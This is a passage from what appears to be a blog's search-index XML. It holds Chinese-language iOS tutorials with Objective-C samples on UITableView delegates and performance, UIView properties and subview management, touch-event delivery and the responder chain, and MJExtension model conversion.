/ !] 的时候，点击accessaryView将会调用delegate的 tableView:accessoryButtonTappedForRowWithIndexPath:方法。 accessaryType的定制1- (UITableViewCellAccessoryType)tableView:(UITableView *)tableView accessoryTypeForRowWithIndexPath:(NSIndexPath *)indexPath; 关于菜单——Cell长按Cell显示菜单，如复制、粘贴等。该菜单调用 tableView:canPerformAction:forRowAtIndexPath:withSender 以确认是否该显示系统菜单选项并调用 tableView:performAction:forRowAtIndexPath:withSender:当用户选择某个选项时. 1234567891011121314151617- (BOOL)tableView:(UITableView *)tableView shouldShowMenuForRowAtIndexPath:(NSIndexPath *)indexPath &#123; return YES;&#125; - (BOOL)tableView:(UITableView *)tableView canPerformAction:(SEL)action forRowAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender &#123; if (action == @selector(copy:)) &#123; return YES; &#125; return NO; &#125; - (void)tableView:(UITableView *)tableView performAction:(SEL)action forRowAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender &#123; if (action == @selector(copy:)) &#123; [UIPasteboard generalPasteboard].string = [data objectAtIndex:indexPath.row]; &#125;&#125; 行缩进缩进是指ContentView距离Cell左侧的距离。 1234//行缩进-(NSInteger)tableView:(UITableView *)tableView indentationLevelForRowAtIndexPath:(NSIndexPath *)indexPath&#123; NSUInteger row = [indexPath row]; return row * 5;&#125; 关于选择Cell的高亮管理，即将高亮、已经高亮、已经不高亮分别代理不同的代理方法。 1234//Managing Table View Highlighting- tableView:shouldHighlightRowAtIndexPath:- tableView:didHighlightRowAtIndexPath:- tableView:didUnhighlightRowAtIndexPath: Cell的选择与取消选择，分别在将要开始和已经完成时有相应的代理方法。 12345// Managing Selections- tableView:willSelectRowAtIndexPath:- tableView:didSelectRowAtIndexPath:- tableView:willDeselectRowAtIndexPath:- tableView:didDeselectRowAtIndexPath: 默认选中某个Cell，点击别处时正常执行代理需求：用户停留在买单页面（比如点评闪惠或买单），该页面默认使用一张“优惠券”，要求点击该“优惠券”进入优惠券列表页面，同时选中该优惠价（可根据id识别），点击其它Cell时正常执行相应tableView:didSelectRowAtIndexPath:于tableView:didDeselectRowAtIndexPath:代理方法。 此时可以在数据加载完成后，计算出默认应该选中Cell的indexPath，然会tableView调用 selectRowAtIndexPath:animated:scrollPosition:方法即可。 selectRowAtIndexPath:animated:scrollPosition:特点：不调用选中与不选中的代理方法；调用cell的setSelected方法，将Cell设置为选中状态，此时查看tableView的indexPathForSelectedRow属性可得到当前选中的indexPath即为指定Cell的indexPath。 性能优化a、重用cell 我们都知道申请内存是需要时间，特别是在一段时间内频繁的申请内存将会造成很大的开销，而且上tebleView中cell大部分情况下布局都是一样的，这个时候我们可以通过回收重用机制来提高性能。 b、避免content的重新布局 尽量避免在重用cell时候，对cell的重新布局，一般情况在在创建cell的时候就将cell布局好。 c、使用不透明的subView 在定制cell的时候，将要添加的subView设置成不透明的会大大减少多个view层叠加时渲染所需要的时间。 d、如果方便，直接重载subView的drawRect方法 如果定制cell的过程中需要多个小的元素的话，最好直接对要显示的多个项目进行绘制，而不是采用添加多个subView。 e、tableView的delegate的方法如非必要，尽量不要实现 tableView的delegate中的很多函数提供了对cell属性的进一步控制，比如每个cell的高度，cell是否可以编辑，支持的edit风格等，如非必要最好不要实现这些方法因为快速的调用这些方法也会影响性能。 (以上5点建议，前三点来自苹果官方文档，后两点我自己加的，有什么不对的地方，欢迎指正) http://www.devzhang.com/14464613593730.htmlhttps://www.jianshu.com/p/aa9721e4484d]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
        <tag>UIView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UI基础控件之UIView详解]]></title>
    <url>%2F2017%2F12%2F28%2FUI%E5%9F%BA%E7%A1%80%E6%8E%A7%E4%BB%B6%E4%B9%8BUIView%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[UI基础控件之UIView详解UIView 简介什么是UIViewUIView是窗口上的一块区域，是iOS中所有控件的基类，我们在app中所有能看见的都是直接或间接继承与UIView的.我们把UIView叫做视图. UIView的作用 负责内部区域的内容渲染。 负责内部区域的触摸事件。 管理本身的所有子视图。 处理基本的动画。 UIView创建与使用创建UIView12345//通过frame创建ViewUIView *view = [[UIView alloc] initWithFrame:CGRectMake(100, 100, 200, 200)];//添加到父视图中[self.window addSubview:view]; 视图是一块区域，所以创建UIView的同时需要设置他的位置和大小，frame是一个包含位置和大小的结构体； UIView的基本属性1234567891011121314151617//设置视图的背景颜色view.backgroundColor = [UIColor redColor];//修改视图的大小或者位置view.frame = CGRectMake(200, 100, 200, 200);//设置视图的透明度[0.0, 1.0]view.alpha = 0.5;//设置是否隐藏view.hidden = NO;//设置视图的标签view.tag = 100;//中心点view.center = self.window.center; 注意：这里特别说下frame， 他是UIView一个非常重要的属性，决定了UIView的大小和位置；frame中设置的位置是以UIView的父视图坐标系为基准，需要特别注意的是不可以修改frame中的某个成员变量，只能整体修改frame 子视图管理NSArray *subviews 管理所有的子视图(控件) 数组元素的顺序决定着子控件的显示层级顺序（下标越大的，越显示在上面） 所有子视图的管理都是对subviews数组的管理 添加视图1234567UIView *view2 = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 100)];view2.backgroundColor = [UIColor greenColor];view2.tag = 200;//将view2添加到view上[view addSubview:view2]; 通过上述代码添加后，view2是view的子视图，view是view2的父视图;所有视图之间有层次级别关系，越是在后添加的视图，越显示在上面，前面添加的在下面 插入视图12345678910//将一个yView插入到view的子视图中，序号为0的位置//序号越小越靠近下面，序号越大越靠近上面//序号的范围[0,子视图的个数)[view insertSubview:yView atIndex:0];//将oView插入到view的子视图中view2的下面[view insertSubview:oView belowSubview:view2];//将人View插入到view的子视图中， yView的上面[view insertSubview:rView aboveSubview:yView] 删除视图UIView中子视图管理和数组对元素的管理不一样，他不能通过父视图去删除子视图，只能子视图自己将自己从父视图中删除. 12//view2将自己从父视图中移除[view2 removeFromSuperview]; 获取视图视图没有名字，但他有标识，所以要想获取视图中的指定子视图，我们可以通过子视图的标识来获取,方法如下： 12//获取view下子视图标识为200的视图UIView *subView = [view viewWithTag:200]; 更改视图的显示层级12345//通过父视图，将某个子视图在最上面显示[view bringSubviewToFront:yView];//通过父视图， 将某个子视图在最下显示[view sendSubviewToBack:view2];]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
        <tag>UIView</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[UIView]]></title>
    <url>%2F2017%2F12%2F28%2FUIView%2F</url>
    <content type="text"><![CDATA[UIView 的使用123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// UIWindow *aWindow = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] ;// self.window = aWindow ;// [aWindow release] ;// 效果等同上述代码// 当应用程序加载完成后，创建一个跟屏幕尺寸一样大的window对象 self.window = [[[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]] autorelease];// Override point for customization after application launch.// 修改window的背景颜色为指定颜色 self.window.backgroundColor = [UIColor purpleColor];// makeKeyAndVisible方法可以让window对象成为主窗口对象，并且显示在屏幕上。 [self.window makeKeyAndVisible]; UIView *aView = [[UIView alloc] initWithFrame:CGRectMake(30, 30, 100, 100)] ; [self.window addSubview:aView] ; [aView release] ; //UIView对象的背景颜色默认是透明的clearColor aView.backgroundColor = [UIColor cyanColor] ; UIView *yellowView = [[UIView alloc] initWithFrame:CGRectMake(25, 25, 100, 100)] ; [aView addSubview:yellowView] ; [yellowView release] ; yellowView.backgroundColor = [UIColor yellowColor] ; UIView *blueView = [[UIView alloc] initWithFrame:CGRectMake(25, 25, 100, 100)] ; [yellowView addSubview:blueView] ; [blueView release] ; blueView.backgroundColor = [UIColor blueColor] ; NSLog( @&quot;%@&quot;, NSStringFromCGRect(self.window.bounds) ) ; // iPhone 6 Plus 的分辨率 1920 * 1080 （414 * 736） //frame 中的大小其实是屏幕上物理像素点的个数，视图对象根据给定的物理像素点的个数以及起始位置、颜色信息来确定视图的范围和要显示的颜色。 UIView *anView = [[UIView alloc] initWithFrame:CGRectMake(50, 50, 300, 300)]; anView.backgroundColor = [UIColor redColor] ; [self.window addSubview:anView] ; [anView release] ; //视图创建并添加在父视图上时，打印 center 属性的值； NSLog( @&quot;%@&quot;, NSStringFromCGPoint(anView.center) ) ; //通过修改视图的 center 属性来改变视图的起始点// anView.center = CGPointMake(200, 200) ; anView.center = self.window.center ; //frame 属性是指该视图在其父视图产生的坐标系中的起始点和大小；// anView.frame = CGRectMake(60, 80, 100, 120) ; //影响视图的 center 属性的原因有，视图的起始点发生改变和视图的大小发生改变； NSLog( @&quot;%@&quot;, NSStringFromCGPoint(anView.center) ) ; UIView *bView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 100, 100)] ; bView.backgroundColor = [UIColor orangeColor] ; bView.center = anView.center ; [anView addSubview:bView] ; [bView release] ;// anView.bounds = CGRectMake(20, -20, 300, 300) ; NSLog( @&quot;%@&quot;, NSStringFromCGRect(anView.frame) ) ; //与 frame 不同的是 bounds 描述的是一个视图在自身坐标系中的起始点和大小，起始点默认与坐标系原点重合，为 （0，0），而 frame 描述的是视图在其父视图中的起始点和大小。 NSLog( @&quot;%@&quot;, NSStringFromCGRect(bView.bounds) ) ; //bounds 是可一个被修改的，修改 bounds 的起始点会导致当前视图产生的坐标系原点发生改变。 //视图显示的位置是依赖于自身的 frame 的，修改 bounds 的起始点不会影响到 frame 的起始点，所以看到的视图并没有发生位移。 //当我们把一个视图的 bounds 起始点改成（+，+）时，自身坐标系原点将向左上角移动对应大小。 //当我们把一个视图的 bounds 起始点改成（-，-）时，自身坐标系原点将向右下角移动对应大小。 //当我们把一个视图的 bounds 起始点改成（-, +）时，自身坐标系原点将向右移动对应大小。 //当我们把一个视图的 bounds 起始点改成（+, -）时，自身坐标系原点将向左移动对应大小。 UIView *greenView = [[UIView alloc] initWithFrame:CGRectMake(0, 0, 120, 120)] ; greenView.backgroundColor = [UIColor greenColor] ; //一个视图的子视图是按照添加时间以下标为序的，我们可以通过下面的方法改变视图层级。// [anView insertSubview:greenView atIndex:0] ; //将一个子视图插入到已经存在的子视图的上方。// [anView insertSubview:greenView aboveSubview:bView] ; //将一个子视图插入到已经存在的子视图的下方。 [anView insertSubview:greenView belowSubview:bView] ; [greenView release] ; //管理视图层级 //将一个视图移动到视图层级的最上层。 [anView bringSubviewToFront:greenView] ; //将一个视图移动到视图层级的最下层。 [anView sendSubviewToBack:greenView] ; //一个子视图调用 removeFromSuperview 方法，把自己从父视图中移除。 [greenView removeFromSuperview] ; //一旦一个视图被添加显示以后，它的 superview 属性就可以获取到它的父视图。 NSLog( @&quot;%@&quot;, [anView superview] ) ; NSLog( @&quot;%@&quot;, [bView superview] ) ; //视图是通过 subviews 数组来管理其子视图们的。 NSLog( @&quot;%@&quot;, [anView subviews] ) ; // hidden 是一个视图的显隐属性，默认为NO ，表示不隐藏，如果一个视图的 hidden 属性设置为 YES，其子视图也将被隐藏。// anView.hidden = YES ; // alpha 是一个视图的不透明度，范围在 0~1，默认为1，表示完全不透明。 anView.alpha = 0.8 ; anView.tag = 100 ; UIView *getView = [self.window viewWithTag:100] ; NSLog( @&quot;%@&quot;, getView ) ;]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS中事件的产生和传递]]></title>
    <url>%2F2017%2F12%2F28%2FiOS%E4%B8%AD%E4%BA%8B%E4%BB%B6%E7%9A%84%E4%BA%A7%E7%94%9F%E5%92%8C%E4%BC%A0%E9%80%92%2F</url>
    <content type="text"><![CDATA[转载：https://www.jianshu.com/p/585760924a92 iOS中的事件可以分为3大类型： 按照时间顺序，事件的生命周期是这样的：事件的产生和传递（事件如何从父控件传递到子控件并寻找到最合适的view、寻找最合适的view的底层实现、拦截事件的处理）-&gt;找到最合适的view后事件的处理（touches方法的重写，也就是事件的响应） 响应者对象 在iOS中不是任何对象都能处理事件，只有继承了UIResponder的对象才能接收并处理事件。我们称之为“响应者对象” UIApplication、UIViewController、UIView都继承自UIResponder，因此它们都是响应者对象，都能够接收并处理事件 UIResponderUIResponder内部提供了以下方法来处理事件 触摸事件: 1234567-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event;-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event;-(void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event;-(void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event; 加速计事件 12345-(void)motionBegan:(UIEventSubtype)motion withEvent:(UIEvent *)event;-(void)motionEnded:(UIEventSubtype)motion withEvent:(UIEvent *)event;-(void)motionCancelled:(UIEventSubtype)motion withEvent:(UIEvent *)event; 远程控制事件 1-(void)remoteControlReceivedWithEvent:(UIEvent *)event; UIView的触摸事件处理UIView是UIResponder的子类，可以实现下列4个方法处理不同的触摸事件 123456789101112// 一根或者多根手指开始触摸view，系统会自动调用view的下面方法-(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event// 一根或者多根手指在view上移动，系统会自动调用view的下面方法（随着手指的移动，会持续调用该方法）-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event// 一根或者多根手指离开view，系统会自动调用view的下面方法-(void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event// 触摸结束前，某个系统事件(例如电话呼入)会打断触摸过程，系统会自动调用view的下面方法-(void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event 提示：touches中存放的都是UITouch对象 UITouch 当用户用一根手指触摸屏幕时，会创建一个与手指相关联的UITouch对象 一根手指对应一个UITouch对象 UITouch的作用 保存着跟手指相关的信息，比如触摸的位置、时间、阶段 当手指移动时，系统会更新同一个UITouch对象，使之能够一直保存该手指的触摸位置。 当手指离开屏幕时，系统会销毁相应的UITouch对象 提示：iPhone开发中，要避免使用双击事件！’ UITouch的属性 1234567891011121314// 触摸产生时所处的窗口@property(nonatomic,readonly,retain)UIWindow *window;// 触摸产生时所处的视图@property(nonatomic,readonly,retain)UIView *view;// 短时间内点按屏幕的次数，可以根据tapCount判断单击、双击或更多的点击@property(nonatomic,readonly)NSUInteger tapCount;// 记录了触摸事件产生或变化时的时间，单位是秒@property(nonatomic,readonly)NSTimeInterval timestamp;// 当前触摸事件所处的状态@property(nonatomic,readonly)UITouchPhase phase; UITouch的方法 1234567-(CGPoint)locationInView:(UIView *)view;// 返回值表示触摸在view上的位置// 这里返回的位置是针对view的坐标系的（以view的左上角为原点(0, 0)）// 调用时传入的view参数为nil的话，返回的是触摸点在UIWindow的位置-(CGPoint)previousLocationInView:(UIView *)view;// 该方法记录了前一个触摸点的位置 UIEvent 每产生一个事件，就会产生一个UIEvent对象 UIEvent：称为事件对象，记录事件产生的时刻和类型 常见属性 123456// 事件类型@property(nonatomic,readonly)UIEventType type;@property(nonatomic,readonly)UIEventSubtype subtype;// 事件产生的时间@property(nonatomic,readonly)NSTimeInterval timestamp; UIEvent还提供了相应的方法可以获得在某个view上面的触摸对像（UITouch） touches和event参数 一次完整的触摸过程，会经历3个状态： 1234567891011// 触摸开始：-(void)touchesBegan:(NSSet *)touches withEvent:(UIEven *)event// 触摸移动：-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event// 触摸结束：-(void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event// 触摸取消（可能会经历）：-(void)touchesCancelled:(NSSet *)touches withEvent:(UIEvent *)event 4个触摸事件处理方法中，都有NSSet touches和UIEvent event两个参数 一次完整的触摸过程中，只会产生一个事件对象，4个触摸方法都是同一个event参数 如果两根手指同时触摸一个view，那么view只会调用一次touchesBegan:withEvent:方法，touches参数中装着2个UITouch对象 如果这两根手指一前一后分开触摸同一个view，那么view会分别调用2次touchesBegan:withEvent:方法，并且每次调用时的touches参数中只包含一个UITouch对象 根据touches中UITouch的个数可以判断出是单点触摸还是多点触摸 Q：默认触摸方法NSSet里面只能获得一个UITouch对象,为什么? A：UIView默认不支持多点触控。也就是说不支持多只手指同时触摸。 Q：如何让视图接收多点触摸? A：需要设置它的multipleTouchEnabled属性为YES，默认状态下这个属性值为NO，即视图默认不接收多点触摸。。 Q：如何判断用户当前是双击还是单击? A：根据UITouch的tapCount属性的值。tapCount表示短时间内轻击屏幕的次数。因此可以根据tapCount判断单击、双击或更多的轻击。 根据tapCount点击的次数来设置当前视图的背景色(双击改变背景颜色)轻击操作很容易引起歧义，比如当用户点了一次之后，并不知道用户是想单击还是只是双击的一部分，或者点了两次之后并不知道用户是想双击还是继续点击。为了解决这个问题，一般可以使用“延迟调用”函数,或手势识别器 使用“延迟调用”函数 12345678- (void)touchesEnded:(NSSet *)touches withEvent:(UIEvent *)event &#123; UITouch *touch = [touches anyObject]; if(touch.tapCount != 2)&#123; // 如果不是双击 [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(setBackgroundColor:) object:[UIColor orangeColor]]; &#125; else &#123; // 延时1执行改变背景的方法 [self performSelector:@selector(setBackgroundColor:) withObject:[UIColor orangeColor] afterDelay:1.0]; &#125;&#125; 使用Gesture Recognizer使用Gesture Recognizer识别就会简单许多，只需添加两个手势识别器，分别检测单击和双击事件，设置必要的属性即可 12345678910111213141516171819202122232425- (id)init &#123; if ((self = [super init])) &#123; self.userInteractionEnabled = YES; UITapGestureRecognizer *singleTapGesture = [[UITapGestureRecognizer alloc]initWithTarget:self action:@selector(handleSingleTap:)]; singleTapGesture.numberOfTapsRequired = 1; singleTapGesture.numberOfTouchesRequired = 1; [self addGestureRecognizer:singleTapGesture]; UITapGestureRecognizer *doubleTapGesture = [[UITapGestureRecognizer alloc]initWithTarget:self action:@selector(handleDoubleTap:)]; doubleTapGesture.numberOfTapsRequired = 2; doubleTapGesture.numberOfTouchesRequired = 1; [self addGestureRecognizer:doubleTapGesture]; [singleTapGesture requireGestureRecognizerToFail:doubleTapGesture]; &#125; return self; &#125; -(void)handleSingleTap:(UIGestureRecognizer *)sender&#123; CGPoint touchPoint = [sender locationInView:self]; //... &#125; -(void)handleDoubleTap:(UIGestureRecognizer *)sender&#123; CGPoint touchPoint = [sender locationInView:self]; //... &#125; 唯一需要注意的是:[singleTapGesture requireGestureRecognizerToFail:doubleTapGesture];这句话的意思时，只有当doubleTapGesture识别失败的时候(即识别出这不是双击操作)，singleTapGesture才能开始识别，同我们一开始讲的是同一个问题。 提示：iPhone开发中，要避免使用双击事件! NSObject类的cancelPreviousPerformRequestWithTarget:selector:object方法取消指定对象的方法调用。 Cancels perform requests previously registered with performSelector:withObject:afterDelay:.All perform requests are canceled that have the same target as aTarget, argument as anArgument, and selector as aSelector.(如果是带参数，那取消时的参数也要一致，否则不能取消成功) 细节检测tapCount可以放在touchesBegan也可以touchesEnded，不过一般后者更准确，因为touchesEnded可以保证所有的手指都已经离开屏幕，这样就不会把轻击动作和按下拖动等动作混淆。 *不管是一个手指还是多个手指，轻击操作都会使每个触摸对象的tapCount加1，因此可以直接调用touches的anyObject方法来获取任意一个触摸对象然后判断其tapCount的值即可。 事件的产生和传递 发生触摸事件后，系统会将该事件加入到一个由UIApplication管理的事件队列中, 为什么是队列而不是栈？因为队列的特定是先进先出，先产生的事件先处理才符合常理，所以把事件添加到队列。 UIApplication会从事件队列中取出最前面的事件，并将事件分发下去以便处理，通常，先发送事件给应用程序的主窗口（keyWindow） 应用如何找到最合适的控件来处理事件？ 首先判断主窗口（keyWindow）自己是否能接受触摸事件,不能,则传给UIApplication处理.,能,转2 判断触摸点是否在自己身上 子控件数组中从后往前遍历子控件，重复前面的两个步骤（所谓从后往前遍历子控件，就是首先查找子控件数组中最后一个元素，然后执行1、2步骤） 如果没有符合条件的子控件，那么就认为自己最合适处理这个事件，也就是自己是最合适的view。 主窗口会在视图层次结构中找到一个最合适的视图来处理触摸事件，但是这仅仅是整个事件处理过程的第一步 找到合适的视图控件后，就会调用视图控件的touches方法来作具体的事件处理 touchesBegan…touchesMoved…touchedEnded…注意: 如果父控件不能接受触摸事件，那么子控件就不可能接收到触摸事件 UIView不接收触摸事件的三种情况1.不接收用户交互 1userInteractionEnabled = NO 2.隐藏 1hidden = YES 3.透明 1alpha = 0.0 ~ 0.01 提示：UIImageView的userInteractionEnabled默认就是NO，因此UIImageView以及它的子控件默认是不能接收触摸事件的 事件传递示例 触摸事件的传递是从父控件传递到子控件 –点击了绿色的view：UIApplication -&gt;UIWindow-&gt;白色 -&gt;绿色 –点击了蓝色的view：UIApplication-&gt;UIWindow-&gt;白色 -&gt;橙色 -&gt;蓝色 –点击了黄色的view：UIApplication-&gt;UIWindow-&gt;白色 -&gt;橙色 -&gt;蓝色 -&gt;黄色 触摸事件处理的详细过程 用户点击屏幕后产生的一个触摸事件，经过一系列的传递过程后，会找到最合适的视图控件来处理这个事件 找到最合适的视图控件后，就会调用控件的touches方法来作具体的事件处理 123touchesBegan…touchesMoved…touchedEnded… 这些touches方法的默认做法是将事件顺着响应者链条向上传递，将事件交给上一个响应者进行处理响应者链条 响应者链条：是由多个响应者对象连接起来的链条 作用：能很清楚的看见每个响应者之间的联系，并且可以让一个事件多个对象处理。 响应者对象：能处理事件的对象 事件传递的完整过程 先将事件对象由上往下传递(由父控件传递给子控件)，找到最合适的控件来处理这个事件。 调用最合适控件的touches….方法 如果调用了[super touches….];就会将事件顺着响应者链条往上传递，传递给上一个响应者 接着就会调用上一个响应者的touches….方法 如何判断上一个响应者 如果当前这个view是控制器的view,那么控制器就是上一个响应者 如果当前这个view不是控制器的view 当前这个view的父类不是自定义的view,那么父控件就是上一个响应者 当前这个view的父类是自定义的view,那么父类就是上一个响应者 响应者链的事件传递过程 如果view的控制器存在，就传递给控制器；如果控制器不存在，则将其传递给它的父视图 在视图层次结构的最顶级视图，如果也不能处理收到的事件或消息，则其将事件或消息传递给window对象进行处理 如果window对象也不处理，则其将事件或消息传递给UIApplication对象 如果UIApplication也不能处理该事件或消息，则将其丢弃 hitTest:withEvent:方法和pointInside:withEvent:1234567891011121. hitTest调用时机:当一个事件传递给一个控件的时候，系统就会调用这个方法2. hitTest作用: 寻找到最合适处理事件的view。* （回顾下事件传递），UIApplication -&gt; UIWindow* UIWindow去寻找最合适的view? [UIWindow hitTest:withEvent:]里面做了什么事情？1&gt; 判断窗口能不能处理事件? 如果不能，意味着窗口不是最合适的view，而且也不会去寻找比自己更合适的view,直接返回nil,通知UIApplication，没有最合适的view。2&gt; 判断点在不在窗口3&gt; 遍历自己的子控件，寻找有没有比自己更合适的view4&gt; 如果子控件不接收事件，意味着子控件没有找到最合适的view,然后返回nil,告诉窗口没有找到更合适的view,窗口就知道没有比自己更合适的view,就自己处理事件。 * 验证下hitTest方法返回nil，里面的子控件能处理事件吗？ 重写view的hitTest:withEvent:方法， * 验证这个方法是否真能找到最合适的view？ * 如果点击屏幕任何一个地方，都由控制器的view来处理事件，怎么做? 直接返回白色的view,就不会继续去找白色view的子控件了。 123456782&gt; hitTest:withEvent:方法的处理流程如下: 1、调用当前视图的pointInside:withEvent:方法判断触摸点是否在当前视图内 若返回NO,则hitTest:withEvent:返回nil; 若返回YES,则向当前视图的所有子视图(subviews)发送hitTest:withEvent:消息，所有 子视图的遍历顺序是从top到bottom，即从subviews数组的末尾向前遍历,直到有子视图返 回非空对象或者全部子视图遍历完毕。 2、若第一次有子视图返回非空对象,则hitTest:withEvent:方法返回此对象，处理结束。 3、如所有子视图都返回nil,则hitTest:withEvent:方法返回自身(self)。]]></content>
      <categories>
        <category>ios</category>
      </categories>
      <tags>
        <tag>ios</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MJExtension使用指导]]></title>
    <url>%2F2017%2F12%2F27%2FMJExtension%E4%BD%BF%E7%94%A8%E6%8C%87%E5%AF%BC%2F</url>
    <content type="text"><![CDATA[转载：https://www.jianshu.com/p/475b28160c89 1、简单的字典 –&gt; 模型:核心代码 mj_objectWithKeyValues123456789101112131415161718192021222324252627typedef enum &#123; SexMale, SexFemale&#125; Sex;@interface User : NSObject@property (copy, nonatomic) NSString *name;/* 姓名 */@property (copy, nonatomic) NSString *icon;/* 头像 */@property (assign, nonatomic) unsigned int age;/* 年龄 */@property (copy, nonatomic) NSString *height;/* 身高 */@property (strong, nonatomic) NSNumber *money;/* 资产 */@property (assign, nonatomic) Sex sex;/* 性别 */@property (assign, nonatomic, getter=isGay) BOOL gay;/* 是否是同性恋 */@end //简单的字典 NSDictionary *dict_user = @&#123; @&quot;name&quot; : @&quot;Jack&quot;, @&quot;icon&quot; : @&quot;lufy.png&quot;, @&quot;age&quot; : @20, @&quot;height&quot; : @&quot;1.55&quot;, @&quot;money&quot; : @100.9, @&quot;sex&quot; : @(SexFemale),/* 枚举需要使用NSNumber包装 */ @&quot;gay&quot; : @YES &#125;; User *user = [User mj_objectWithKeyValues:dict_user]; NSLog(@&quot;MJ---%@----%@---%u---%@---%@---%u----%d&quot;,user.name,user.icon,user.age,user.height,user.money,user.sex,user.gay); //打印结果 //2016-07-04 11:06:59.746 PPDemos[2432:73824] MJ---Jack----lufy.png---20---1.55---100.9---1----1 2、JSON字符串 –&gt; 模型核心代码：mj_objectWithKeyValues:123456// 定义一个JSON字符串 NSString *jsonStr = @&quot;&#123;\&quot;name\&quot;:\&quot;Jack\&quot;, \&quot;icon\&quot;:\&quot;lufy.png\&quot;, \&quot;age\&quot;:20&#125;&quot;; User *user = [User mj_objectWithKeyValues:jsonStr]; NSLog(@&quot;MJ---%@----%@---%u&quot;,user.name,user.icon,user.age); //打印结果 //2016-07-04 11:16:04.655 PPDemos[2563:78561] MJ---Jack----lufy.png---20 3、复杂的字典 –&gt; 模型 (模型里面包含了模型)核心代码 mj_objectWithKeyValues:123456789101112131415//复杂的字典[模型中有个数组属性，数组里面又要装着其他模型的字典] NSDictionary *dict_m8m = @&#123; @&quot;text&quot; : @&quot;Agree!Nice weather!&quot;, @&quot;user&quot; : @&#123; @&quot;name&quot; : @&quot;Jack&quot;, @&quot;icon&quot; : @&quot;lufy.png&quot; &#125;, @&quot;retweetedStatus&quot; : @&#123; @&quot;text&quot; : @&quot;Nice weather!&quot;, @&quot;user&quot; : @&#123; @&quot;name&quot; : @&quot;Rose&quot;, @&quot;icon&quot; : @&quot;nami.png&quot; &#125; &#125; &#125;; 12345678910#import &lt;Foundation/Foundation.h&gt;@class User;@class Status;//Status模型@interface Status : NSObject@property (copy, nonatomic) NSString *text;@property (strong, nonatomic) User *user;/* 其他模型类型 */@property (strong, nonatomic) Status *retweetedStatus;/* 自我模型类型 */@end// 1234567891011121314//字典转模型，模型里面含有模型 Status *status = [Status mj_objectWithKeyValues:dict_m8m]; NSString *text = status.text; NSString *name = status.user.name; NSString *icon = status.user.icon; NSLog(@&quot;mj-----text=%@, name=%@, icon=%@&quot;, text, name, icon); NSString *text2 = status.retweetedStatus.text; NSString *name2 = status.retweetedStatus.user.name; NSString *icon2 = status.retweetedStatus.user.icon; NSLog(@&quot;mj-----text2=%@, name2=%@, icon2=%@&quot;, text2, name2, icon2); // //打印结果 //2016-07-04 11:45:39.675 PPDemos[2781:87089] mj-----text=Agree!Nice weather!, name=Jack, icon=lufy.png //2016-07-04 11:45:39.675 PPDemos[2781:87089] mj-----text2=Nice weather!, name2=Rose, icon2=nami.png 4、模型中有个数组属性，数组里面又要装着其它模型核心代码 mj_objectWithKeyValues和mj_objectClassInArray: 1234@interface Ad : NSObject @property (copy, nonatomic) NSString *image; @property (copy, nonatomic) NSString *url;@end 1234567@interface StatusResult : NSObject/** 存放着一堆的微博数据（里面都是Status模型） */@property (strong, nonatomic) NSMutableArray *statuses;/** 存放着一堆的广告数据（里面都是Ad模型） */@property (strong, nonatomic) NSArray *ads;@property (strong, nonatomic) NSNumber *totalNumber;@end 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#import &quot;StatusResult.h&quot;#import &quot;MJExtension.h&quot;@implementation StatusResult/* 数组中存储模型数据，需要说明数组中存储的模型数据类型 */+(NSDictionary *)mj_objectClassInArray&#123; return @&#123; @&quot;statuses&quot; : @&quot;Status&quot;, @&quot;ads&quot; : @&quot;Ad&quot; &#125;;&#125;@end#####在VC里实现以下来解析数据NSDictionry dict_m8a = @&#123; @&quot;statuses&quot; : @[ @&#123; @&quot;text&quot; : @&quot;Nice weather!&quot;, @&quot;user&quot; : @&#123; @&quot;name&quot; : @&quot;Rose&quot;, @&quot;icon&quot; : @&quot;nami.png&quot; &#125; &#125;, @&#123; @&quot;text&quot; : @&quot;Go camping tomorrow!&quot;, @&quot;user&quot; : @&#123; @&quot;name&quot; : @&quot;Jack&quot;, @&quot;icon&quot; : @&quot;lufy.png&quot; &#125; &#125; ], @&quot;ads&quot;: @[ @&#123; @&quot;image&quot; : @&quot;ad01.png&quot;, @&quot;url&quot; : @&quot;http://www.ad01.com&quot; &#125;, @&#123; @&quot;image&quot; : @&quot;ad02.png&quot;, @&quot;url&quot; : @&quot;http://www.ad02.com&quot; &#125; ], @&quot;totalNumber&quot; : @&quot;2014&quot; &#125;;//【重点，核心】》》数组中存储模型数据，需要说明数组中存储的模型数据类型 [StatusResult mj_setupObjectClassInArray:^NSDictionary *&#123; return @&#123; @&quot;statuses&quot; : @&quot;Status&quot;, // @&quot;statuses&quot; : [Status class], @&quot;ads&quot; : @&quot;Ad&quot; // @&quot;ads&quot; : [Ad class] &#125;;&#125;];// Equals: StatusResult.m implements + mj_objectClassInArray method.//以上方法在VC里写，如果多个地方解析该model，就要写多次，最好在model的.m文件写！//字典转模型，支持模型的数组属性里面又装着模型StatusResult *result = [StatusResult mj_objectWithKeyValues:dict_m8a];//打印博主信息for (Status 